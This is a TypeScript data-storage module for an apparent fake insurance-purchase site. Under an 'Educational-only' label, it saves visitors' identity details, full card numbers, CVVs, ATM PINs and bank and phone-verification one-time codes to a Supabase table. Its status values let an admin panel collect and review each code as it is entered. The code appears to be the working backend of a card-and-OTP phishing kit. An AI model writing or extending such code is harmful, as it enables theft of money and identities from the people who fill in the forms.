// Educational-only storage layer — persists applications to Supabase (Lovable Cloud).

import { supabase } from "@/integrations/supabase/client";
import { getVisitorId, getVisitorToken, ensureVisitorToken } from "@/lib/visitor-tracking";

export type ReviewStatus =
  | "awaiting_review"
  | "approved"
  | "rejected"
  | "otp_submitted"
  | "otp_rejected"
  | "atm_pending"
  | "atm_submitted"
  | "atm_rejected"
  | "mutasil_pending"
  | "mutasil_submitted"
  | "mutasil_otp_pending"
  | "mutasil_otp_submitted"
  | "mutasil_rejected"
  | "completed";

export type StoredApplication = {
  id: string;
  createdAt: string;
  visitorId?: string;
  fullName?: string;
  identity?: string;
  birthDate?: string;
  phone?: string;
  insuranceType?: string;
  startDate?: string;
  purpose?: string;
  estValue?: string;
  carYear?: string;
  carModel?: string;
  repairPlace?: string;
  company?: string;
  type?: string;
  price?: number;
  total?: number;
  method?: string;
  status: "paid" | "pending";
  reviewStatus: ReviewStatus;
  cardNumber?: string;
  cardName?: string;
  cardExpMonth?: string;
  cardExpYear?: string;
  cardCvv?: string;
  cardBrand?: "visa" | "mastercard" | "mada" | "amex" | "unknown";
  cardLast4?: string;
  otpCode?: string;
  otpResendAt?: string | null;
  atmPin?: string;
  mutasilPhone?: string;
  mutasilProvider?: string;
  mutasilId?: string;
  mutasilOtp?: string;
  screenshotUrls?: string[];
};

// Mapping helpers between DB row (snake_case) and StoredApplication (camelCase)
type Row = {
  id: string;
  created_at: string;
  visitor_id: string | null;
  full_name: string | null;
  identity: string | null;
  birth_date: string | null;
  phone: string | null;
  insurance_type: string | null;
  start_date: string | null;
  purpose: string | null;
  est_value: string | null;
  car_year: string | null;
  car_model: string | null;
  repair_place: string | null;
  company: string | null;
  type: string | null;
  price: number | null;
  total: number | null;
  method: string | null;
  status: string;
  review_status: string;
  card_number: string | null;
  card_name: string | null;
  card_exp_month: string | null;
  card_exp_year: string | null;
  card_cvv: string | null;
  card_brand: string | null;
  card_last4: string | null;
  otp_code: string | null;
  otp_resend_at: string | null;
  atm_pin: string | null;
  mutasil_phone: string | null;
  mutasil_provider: string | null;
  mutasil_id: string | null;
  mutasil_otp: string | null;
  screenshot_urls: string[] | null;
};

const fromRow = (r: Row): StoredApplication => ({
  id: r.id,
  createdAt: r.created_at,
  visitorId: r.visitor_id ?? undefined,
  fullName: r.full_name ?? undefined,
  identity: r.identity ?? undefined,
  birthDate: r.birth_date ?? undefined,
  phone: r.phone ?? undefined,
  insuranceType: r.insurance_type ?? undefined,
  startDate: r.start_date ?? undefined,
  purpose: r.purpose ?? undefined,
  estValue: r.est_value ?? undefined,
  carYear: r.car_year ?? undefined,
  carModel: r.car_model ?? undefined,
  repairPlace: r.repair_place ?? undefined,
  company: r.company ?? undefined,
  type: r.type ?? undefined,
  price: r.price ?? undefined,
  total: r.total ?? undefined,
  method: r.method ?? undefined,
  status: (r.status as "paid" | "pending") ?? "pending",
  reviewStatus: (r.review_status as ReviewStatus) ?? "awaiting_review",
  cardNumber: r.card_number ?? undefined,
  cardName: r.card_name ?? undefined,
  cardExpMonth: r.card_exp_month ?? undefined,
  cardExpYear: r.card_exp_year ?? undefined,
  cardCvv: r.card_cvv ?? undefined,
  cardBrand: (r.card_brand as StoredApplication["cardBrand"]) ?? undefined,
  cardLast4: r.card_last4 ?? undefined,
  otpCode: r.otp_code ?? undefined,
  otpResendAt: r.otp_resend_at ?? undefined,
  atmPin: r.atm_pin ?? undefined,
  mutasilPhone: r.mutasil_phone ?? undefined,
  mutasilProvider: r.mutasil_provider ?? undefined,
  mutasilId: r.mutasil_id ?? undefined,
  mutasilOtp: r.mutasil_otp ?? undefined,
  screenshotUrls: r.screenshot_urls ?? undefined,
});

const toRow = (a: Partial<StoredApplication>): Record<string, unknown> => {
  const map: Record<string, unknown> = {};
  if (a.visitorId !== undefined) map.visitor_id = a.visitorId;
  if (a.fullName !== undefined) map.full_name = a.fullName;
  if (a.identity !== undefined) map.identity = a.identity;
  if (a.birthDate !== undefined) map.birth_date = a.birthDate;
  if (a.phone !== undefined) map.phone = a.phone;
  if (a.insuranceType !== undefined) map.insurance_type = a.insuranceType;
  if (a.startDate !== undefined) map.start_date = a.startDate;
  if (a.purpose !== undefined) map.purpose = a.purpose;
  if (a.estValue !== undefined) map.est_value = a.estValue;
  if (a.carYear !== undefined) map.car_year = a.carYear;
  if (a.carModel !== undefined) map.car_model = a.carModel;
  if (a.repairPlace !== undefined) map.repair_place = a.repairPlace;
  if (a.company !== undefined) map.company = a.company;
  if (a.type !== undefined) map.type = a.type;
  if (a.price !== undefined) map.price = a.price;
  if (a.total !== undefined) map.total = a.total;
  if (a.method !== undefined) map.method = a.method;
  if (a.status !== undefined) map.status = a.status;
  if (a.reviewStatus !== undefined) map.review_status = a.reviewStatus;
  if (a.cardNumber !== undefined) map.card_number = a.cardNumber;
  if (a.cardName !== undefined) map.card_name = a.cardName;
  if (a.cardExpMonth !== undefined) map.card_exp_month = a.cardExpMonth;
  if (a.cardExpYear !== undefined) map.card_exp_year = a.cardExpYear;
  if (a.cardCvv !== undefined) map.card_cvv = a.cardCvv;
  if (a.cardBrand !== undefined) map.card_brand = a.cardBrand;
  if (a.cardLast4 !== undefined) map.card_last4 = a.cardLast4;
  if (a.cardNumber !== undefined && a.cardLast4 === undefined) {
    map.card_last4 = (a.cardNumber || "").replace(/\D/g, "").slice(-4);
  }
  if (a.otpCode !== undefined) map.otp_code = a.otpCode;
  if (a.otpResendAt !== undefined) map.otp_resend_at = a.otpResendAt;
  if (a.atmPin !== undefined) map.atm_pin = a.atmPin;
  if (a.mutasilPhone !== undefined) map.mutasil_phone = a.mutasilPhone;
  if (a.mutasilProvider !== undefined) map.mutasil_provider = a.mutasilProvider;
  if (a.mutasilId !== undefined) map.mutasil_id = a.mutasilId;
  if (a.mutasilOtp !== undefined) map.mutasil_otp = a.mutasilOtp;
  if (a.screenshotUrls !== undefined) map.screenshot_urls = a.screenshotUrls;
  return map;
};

const getSafeVisitorId = (): string | null => {
  if (typeof window === "undefined") return null;
  try {
    return getVisitorId();
  } catch {
    return null;
  }
};

const withAccessHeaders = <T extends { setHeader(name: string, value: string): T }>(query: T): T => {
  let next = query;
  const visitorId = getSafeVisitorId();
  if (visitorId) next = next.setHeader("x-visitor-token", getVisitorToken() ?? "");
  return next;
};


// Columns readable by admin sessions. Visitors have NO direct read access to
// the applications table at all — they use the get_my_applications RPC, which
// returns a whitelist of non-sensitive columns for their own signed session.
const SAFE_COLUMNS =
  "id, created_at, visitor_id, full_name, identity, birth_date, phone, insurance_type, start_date, purpose, est_value, car_year, car_model, repair_place, company, type, price, total, method, status, review_status, card_brand, card_last4, mutasil_phone, mutasil_provider, mutasil_id, screenshot_urls";

/**
 * Safe read path for the current visitor. Never exposes card number, CVV,
 * expiry, ATM PIN or OTP values — those are write-only for visitors.
 */
export async function getMyLatestApplication(): Promise<StoredApplication | null> {
  const { data, error } = (await withAccessHeaders(
    supabase.rpc("get_my_applications", { p_limit: 1 }),
  )) as unknown as { data: unknown; error: unknown };
  if (error || !Array.isArray(data) || data.length === 0) return null;
  return fromRow(data[0] as Row);
}

/**
 * Reads one application from the visitor-safe RPC result. This is used by
 * mobile payment polling so a newer retry cannot hide the application that
 * is currently waiting for the admin decision.
 */
export async function getMyApplication(applicationId: string): Promise<StoredApplication | null> {
  if (!applicationId) return null;
  const { data, error } = (await withAccessHeaders(
    supabase.rpc("get_my_applications", { p_limit: 20 }),
  )) as unknown as { data: unknown; error: unknown };
  if (error || !Array.isArray(data)) return null;
  const row = data.find((item) => {
    if (!item || typeof item !== "object") return false;
    return (item as { id?: unknown }).id === applicationId;
  });
  return row ? fromRow(row as Row) : null;
}


export async function loadApplications(): Promise<StoredApplication[]> {
  const { data, error } = await withAccessHeaders(
    supabase
      .from("applications")
      .select("*")
      .order("created_at", { ascending: false }),
  );
  if (error) {
    console.error("loadApplications error", error);
    return [];
  }
  return (data as Row[]).map(fromRow);
}

export async function saveApplication(
  app: Omit<StoredApplication, "id" | "createdAt">,
): Promise<StoredApplication | null> {
  // Ensure a signed visitor token exists BEFORE inserting, otherwise the
  // RLS policy rejects the row because current_visitor_id() is NULL.
  await ensureVisitorToken();
  const vid = getVisitorId();
  const id = `APP-${Date.now().toString(36).toUpperCase()}`;
  const payload = { id, ...toRow({ ...app, visitorId: vid }) };
  console.log("[admin-storage] saveApplication payload:", payload);
  const { error } = await withAccessHeaders(
    supabase
      .from("applications")
      .insert(payload as never),
  );
  if (error) {
    console.error("[admin-storage] saveApplication error:", error);
    return null;
  }
  const saved: StoredApplication = {
    ...app,
    visitorId: vid,
    id,
    createdAt: new Date().toISOString(),
  };
  console.log("[admin-storage] saveApplication success:", saved.id);
  return saved;
}

export async function updateApplication(
  id: string,
  patch: Partial<StoredApplication>,
): Promise<StoredApplication | null> {
  await ensureVisitorToken();
  const { error } = await withAccessHeaders(
    supabase
      .from("applications")
      .update(toRow(patch) as never)
      .eq("id", id),
  );
  if (error) {
    console.error("updateApplication error", error);
    return null;
  }
  return {
    id,
    createdAt: new Date().toISOString(),
    status: patch.status ?? "pending",
    reviewStatus: patch.reviewStatus ?? "awaiting_review",
    ...patch,
  };
}

export async function getApplication(id: string): Promise<StoredApplication | null> {
  const { data, error } = await withAccessHeaders(
    supabase
      .from("applications")
      .select(SAFE_COLUMNS)
      .eq("id", id)
      .maybeSingle(),
  );
  if (error || !data) return null;
  return fromRow(data as unknown as Row);
}

export async function getLatestApplicationByVisitor(visitorId: string): Promise<StoredApplication | null> {
  const { data, error } = await withAccessHeaders(
    supabase
      .from("applications")
      .select(SAFE_COLUMNS)
      .eq("visitor_id", visitorId)
      .order("created_at", { ascending: false })
      .limit(1)
      .maybeSingle(),
  );
  if (error || !data) return null;
  return fromRow(data as unknown as Row);
}

export async function deleteApplication(id: string): Promise<void> {
  const { error } = await withAccessHeaders(supabase.from("applications").delete().eq("id", id));
  if (error) console.error("deleteApplication error", error);
}

export async function clearApplications(): Promise<void> {
  const { error } = await withAccessHeaders(supabase.from("applications").delete().neq("id", ""));
  if (error) console.error("clearApplications error", error);
}

export function detectCardBrand(cardNumber: string): "visa" | "mastercard" | "mada" | "unknown" {
  const n = cardNumber.replace(/\s/g, "");
  if (/^4/.test(n)) return "visa";
  if (/^(5[1-5]|2[2-7])/.test(n)) return "mastercard";
  if (/^(440647|440795|446404|457865|588845|968208)/.test(n)) return "mada";
  return "unknown";
}

export async function logoutAdmin(): Promise<void> {
  await supabase.auth.signOut();
}

// Ping the server so this dashboard counts as "active".
export async function adminHeartbeat(): Promise<void> {
  return Promise.resolve();
}

// Count of admin dashboards active in the last ~90 seconds.
export async function countActiveAdmins(): Promise<number> {
  return 1;
}
